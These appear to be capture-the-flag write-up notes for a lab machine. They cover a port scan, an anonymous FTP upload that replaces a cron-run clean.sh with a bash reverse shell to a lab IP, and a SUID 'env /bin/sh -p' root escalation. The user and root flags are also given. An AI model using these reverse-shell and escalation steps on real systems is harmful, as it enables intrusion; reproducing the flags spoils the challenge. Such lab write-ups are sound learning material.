# Enumerate

```bash
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

## FTP

FTP Anonymous login:
`ftp-anon: Anonymous FTP login allowed`

![[Pasted image 20240505115205.png]]

1) Allowed to upload files to the directory `scripts`.
2) Looks like the `clean.sh` gets run every X minutes, because the file `removed_files.log` gets new lines over time.

# Initial foothold

Edit and upload `clean.sh` to create a reverse shell and wait for the connection:
```clean.sh
#!/bin/bash

bash -i >& /dev/tcp/10.9.0.187/7777 0>&1
```

![[Pasted image 20240505140717.png]]

User flag: `90d6f992585815ff991e68748c414740`
# PrivEsc

System info:
```bash
uname -a

Linux anonymous 4.15.0-99-generic #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

LinPEAS output:
![[Pasted image 20240505142004.png]]
![[Pasted image 20240505141943.png]]

Spawn a root shell:
```bash
env /bin/sh -p
```

Root flag: `4d930091c31a622a7ed10f27999af363`